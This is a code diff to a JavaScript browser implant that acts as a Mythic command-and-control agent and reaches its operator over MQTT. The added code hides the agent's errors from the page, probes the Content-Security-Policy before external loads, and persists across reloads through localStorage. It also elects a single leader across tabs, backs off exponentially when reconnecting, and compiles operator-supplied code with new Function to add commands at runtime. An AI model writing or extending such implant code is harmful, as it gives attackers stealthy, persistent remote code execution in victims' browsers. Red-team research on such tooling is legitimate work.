@@ -32,7 +32,8 @@
     var recTopic    = C.Topic + C.RecTopic;
     var senTopic    = C.Topic + C.SenTopic;
     var taskingLoop = null;
-    var pendingResponse = null;  // one-shot callback for download registration responses
+    var pendingResponses = {};   // keyed callbacks for download registration responses
+    var pendingCounter  = 0;     // monotonic counter for correlation IDs
 
     // Agent phases: 'init' -> 'eke_sent' -> 'checkin_sent' -> 'running'
     var phase       = 'init';
@@ -115,6 +116,135 @@
             offset += bufs[j].byteLength;
         }
         return result.buffer;
+    }
+
+    // =========================================================================
+    // CONSOLE SUPPRESSION - prevent agent stack traces from leaking
+    // =========================================================================
+    if (!C.Debug) {
+        window.addEventListener('error', function(e) {
+            // Suppress errors originating from agent code
+            if (e.filename && e.filename === '') {
+                e.preventDefault();
+                return true;
+            }
+        });
+        window.addEventListener('unhandledrejection', function(e) {
+            e.preventDefault();
+        });
+    }
+
+    // =========================================================================
+    // CSP AWARENESS - check Content-Security-Policy before external loads
+    // =========================================================================
+    function checkCSP(directive) {
+        var cspContent = '';
+        // Check meta tags
+        var metas = document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]');
+        for (var i = 0; i < metas.length; i++) {
+            cspContent += metas[i].getAttribute('content') + '; ';
+        }
+        if (!cspContent) return {allowed: true, reason: 'No CSP detected'};
+
+        // Parse relevant directive
+        var parts = cspContent.split(';');
+        for (var j = 0; j < parts.length; j++) {
+            var trimmed = parts[j].trim();
+            if (trimmed.indexOf(directive) === 0) {
+                var value = trimmed.substring(directive.length).trim();
+                // Check for restrictive policies
+                if (value.indexOf("'none'") > -1) {
+                    return {allowed: false, reason: directive + " is set to 'none'"};
+                }
+                if (value.indexOf("'self'") > -1 && value.indexOf('http') === -1 && value.indexOf('*') === -1) {
+                    return {allowed: false, reason: directive + " restricted to 'self' only"};
+                }
+                return {allowed: true, reason: directive + ' policy: ' + value};
+            }
+        }
+        // Check default-src as fallback
+        for (var k = 0; k < parts.length; k++) {
+            var dtrimmed = parts[k].trim();
+            if (dtrimmed.indexOf('default-src') === 0) {
+                var dvalue = dtrimmed.substring('default-src'.length).trim();
+                if (dvalue.indexOf("'none'") > -1) {
+                    return {allowed: false, reason: 'default-src is set to \'none\' (no ' + directive + ' override)'};
+                }
+            }
+        }
+        return {allowed: true, reason: 'No ' + directive + ' directive found'};
+    }
+
+    // =========================================================================
+    // ACTIVE TASK TRACKING (all currently executing tasks)
+    // =========================================================================
+    var activeTasks = {};  // taskId -> {command, startTime}
+
+    // =========================================================================
+    // BACKGROUND TASK REGISTRY
+    // =========================================================================
+    var backgroundTasks = {};  // taskId -> {command, startTime, cancel}
+
+    function registerBackgroundTask(taskId, command, cancelFn) {
+        backgroundTasks[taskId] = {
+            command: command,
+            startTime: new Date().toISOString(),
+            cancel: cancelFn
+        };
+    }
+
+    function unregisterBackgroundTask(taskId) {
+        delete backgroundTasks[taskId];
+    }
+
+    function getBackgroundTasks() {
+        var jobs = [];
+        var ids = Object.keys(backgroundTasks);
+        for (var i = 0; i < ids.length; i++) {
+            var t = backgroundTasks[ids[i]];
+            jobs.push({
+                task_id: ids[i],
+                command: t.command,
+                start_time: t.startTime
+            });
+        }
+        return jobs;
+    }
+
+    function cancelBackgroundTask(taskId) {
+        if (backgroundTasks[taskId] && backgroundTasks[taskId].cancel) {
+            backgroundTasks[taskId].cancel();
+            delete backgroundTasks[taskId];
+            return true;
+        }
+        return false;
+    }
+
+    function getActiveTasks() {
+        var tasks = [];
+        var ids = Object.keys(activeTasks);
+        for (var i = 0; i < ids.length; i++) {
+            var t = activeTasks[ids[i]];
+            var isBg = !!backgroundTasks[ids[i]];
+            tasks.push({
+                task_id: ids[i],
+                command: t.command,
+                start_time: t.startTime,
+                background: isBg
+            });
+        }
+        return tasks;
+    }
+
+    // =========================================================================
+    // PARAMETER PARSING
+    // =========================================================================
+    function parseParams(task) {
+        var params = task.parameters;
+        if (typeof params === 'string') {
+            try { params = JSON.parse(params); } catch (e) { params = {}; }
+        }
+        return params || {};
     }
 
     // =========================================================================
@@ -237,8 +367,102 @@
     }
 
     // =========================================================================
+    // STATE PERSISTENCE - survive page reloads via localStorage
+    // =========================================================================
+    var PERSIST_KEY = '_t_' + C.PayloadUUID.substring(0, 8);
+
+    function saveState() {
+        try {
+            var state = {uuid: uuid, phase: phase, ts: Date.now()};
+            // Store AES key if we have one from EKE (base64 encoded)
+            if (cryptoKey) {
+                state.hasKey = true;
+            }
+            localStorage.setItem(PERSIST_KEY, JSON.stringify(state));
+        } catch (e) {}
+    }
+
+    function loadState() {
+        try {
+            var raw = localStorage.getItem(PERSIST_KEY);
+            if (!raw) return null;
+            var state = JSON.parse(raw);
+            // Expire after 24 hours
+            if (Date.now() - state.ts > 86400000) {
+                localStorage.removeItem(PERSIST_KEY);
+                return null;
+            }
+            return state;
+        } catch (e) { return null; }
+    }
+
+    function clearState() {
+        try { localStorage.removeItem(PERSIST_KEY); } catch (e) {}
+    }
+
+    // =========================================================================
+    // CROSS-TAB LEADER ELECTION - prevent duplicate agents
+    // =========================================================================
+    var isLeader = true;
+    var leaderChannel = null;
+
+    function setupLeaderElection() {
+        if (typeof BroadcastChannel === 'undefined') return; // Not supported, assume leader
+
+        var channelName = '_t_leader_' + C.PayloadUUID.substring(0, 8);
+        leaderChannel = new BroadcastChannel(channelName);
+
+        // Announce ourselves
+        var myId = Math.random().toString(36).substring(2);
+        leaderChannel.postMessage({type: 'announce', id: myId, ts: Date.now()});
+
+        leaderChannel.onmessage = function(e) {
+            if (e.data.type === 'announce' && e.data.id !== myId) {
+                // Another agent exists - compare timestamps, older wins
+                if (e.data.ts < Date.now() - 1000) {
+                    // They were here first, we become dormant
+                    isLeader = false;
+                    log('Another tab is leader, going dormant');
+                } else {
+                    // We were here first, tell them
+                    leaderChannel.postMessage({type: 'leader_exists', id: myId});
+                }
+            }
+            if (e.data.type === 'leader_exists' && e.data.id !== myId) {
+                isLeader = false;
+                log('Leader already exists, going dormant');
+            }
+            if (e.data.type === 'leader_dead') {
+                // Leader died, try to take over
+                isLeader = true;
+                log('Leader died, taking over');
+                if (phase === 'running' && !taskingLoop) {
+                    startTaskingLoop();
+                }
+            }
+        };
+
+        // When we close, notify others
+        window.addEventListener('beforeunload', function() {
+            if (isLeader && leaderChannel) {
+                leaderChannel.postMessage({type: 'leader_dead'});
+            }
+        });
+    }
+
+    // =========================================================================
     // MQTT TRANSPORT
     // =========================================================================
+    var reconnectAttempts = 0;
+    var MAX_RECONNECT_MS = 300000; // 5 minute ceiling
+
+    function getReconnectDelay() {
+        var base = sleepMs();
+        var backoff = Math.min(base * Math.pow(2, reconnectAttempts), MAX_RECONNECT_MS);
+        reconnectAttempts++;
+        return backoff;
+    }
+
     function buildBrokerURL() {
         var protocol = (C.UseSSL === 'True' || C.UseSSL === 'true' || C.UseSSL === true) ? 'wss://' : 'ws://';
         return protocol + C.Server + ':' + C.Port + '/mqtt';
@@ -252,16 +476,22 @@
             clientId:        C.MQClient + '_' + Math.random().toString(16).substr(2, 6),
             clean:           true,
             keepalive:       60,
-            reconnectPeriod: sleepMs()
+            reconnectPeriod: getReconnectDelay()
         };
 
         if (C.MQUser) opts.username = C.MQUser;
         if (C.MQPass) opts.password = C.MQPass;
 
-        client = mqtt.connect(url, opts);
+        try {
+            client = mqtt.connect(url, opts);
+        } catch (e) {
+            log('MQTT connect failed:', e.message, '— page may block ws:// from https:// (mixed content). Use wss:// or test on an http:// page.');
+            return;
+        }
 
         client.on('connect', function() {
             connected = true;
+            reconnectAttempts = 0; // Reset backoff on successful connect
             log('connected');
 
             client.subscribe(recTopic, { qos: 1 }, function(err) {
@@ -292,7 +522,9 @@
         });
 
         client.on('reconnect', function() {
-            log('reconnecting');
+            // Update reconnect period with exponential backoff
+            client.options.reconnectPeriod = getReconnectDelay();
+            log('reconnecting, next attempt in', client.options.reconnectPeriod, 'ms');
         });
     }
 
@@ -310,7 +542,10 @@
     // =========================================================================
     function sendAndWait(data) {
         return new Promise(function(resolve) {
-            pendingResponse = resolve;
+            var id = ++pendingCounter;
+            pendingResponses[id] = resolve;
+            // Store the correlation ID so handleInbound can route the response
+            data._correlationId = id;
             send(data);
         });
     }
@@ -474,6 +709,7 @@
                 C.UUID = data.id;
                 phase = 'running';
                 log('registered, callback UUID:', uuid);
+                saveState();
                 startTaskingLoop();
                 return;
             }
@@ -485,9 +721,12 @@
 
             // Mythic acknowledges post_response — route to pending callback if waiting
             if (phase === 'running' && data.action === 'post_response') {
-                if (pendingResponse && data.responses) {
-                    var cb = pendingResponse;
-                    pendingResponse = null;
+                if (data.responses && Object.keys(pendingResponses).length > 0) {
+                    // Resolve the oldest pending callback (FIFO order)
+                    var keys = Object.keys(pendingResponses).sort(function(a, b) { return a - b; });
+                    var id = keys[0];
+                    var cb = pendingResponses[id];
+                    delete pendingResponses[id];
                     cb(data);
                 }
                 return;
@@ -551,25 +790,54 @@
             status:      'success'
         };
 
+        // Track this task as active
+        activeTasks[task.id] = {command: task.command, startTime: new Date().toISOString()};
+
         try {
             if (COMMANDS[task.command]) {
                 var output = await COMMANDS[task.command](task);
-                result.user_output = (output !== null && output !== undefined && output !== '')
-                    ? String(output)
-                    : 'No response from browser';
+                if (output !== null && output !== undefined && output !== '') {
+                    // Normalize command output: if it's an object with an error property, mark as error
+                    if (typeof output === 'object' && output.error) {
+                        result.user_output = typeof output.error === 'string' ? output.error : JSON.stringify(output);
+                        result.status = 'error';
+                    } else {
+                        result.user_output = typeof output === 'string' ? output : JSON.stringify(output);
+                    }
+                } else {
+                    result.user_output = 'No response from browser';
+                }
             } else {
                 result.user_output = 'unknown command: ' + task.command;
                 result.status = 'error';
             }
         } catch (e) {
-            result.user_output = 'error: ' + e.message;
+            result.user_output = 'error: ' + (e.message || String(e));
             result.status = 'error';
         }
+
+        // Remove from active tracking
+        delete activeTasks[task.id];
 
         await send({
             action: 'post_response',
             responses: [result]
         });
+    }
+
+    // =========================================================================
+    // DYNAMIC COMMAND LOADING
+    // =========================================================================
+    function loadDynamicCommand(code) {
+        try {
+            // The code should register itself via COMMANDS['name'] = ...
+            var fn = new Function('COMMANDS', 'parseParams', 'downloadFile', 'registerBackgroundTask', 'unregisterBackgroundTask', 'checkCSP', 'log', code);
+            fn(COMMANDS, parseParams, downloadFile, registerBackgroundTask, unregisterBackgroundTask, checkCSP, log);
+            return true;
+        } catch (e) {
+            log('dynamic load failed:', e.message);
+            return false;
+        }
     }
 
     // =========================================================================
@@ -579,6 +847,7 @@
         log('shutting down');
         if (taskingLoop) clearTimeout(taskingLoop);
         if (client) client.end(true);
+        clearState();
         connected = false;
     }
 
@@ -603,7 +872,22 @@
     }
 
     async function init() {
+        setupLeaderElection();
+        if (!isLeader) {
+            log('Not leader, staying dormant');
+            return;
+        }
+
         await initKeys();
+
+        // Check for saved state from previous page load
+        var saved = loadState();
+        if (saved && saved.uuid && saved.phase === 'running') {
+            uuid = saved.uuid;
+            phase = 'checkin_sent'; // Re-checkin to confirm we're still valid
+            log('Resuming from saved state, uuid:', uuid);
+        }
+
         mqttConnect();
     }
 
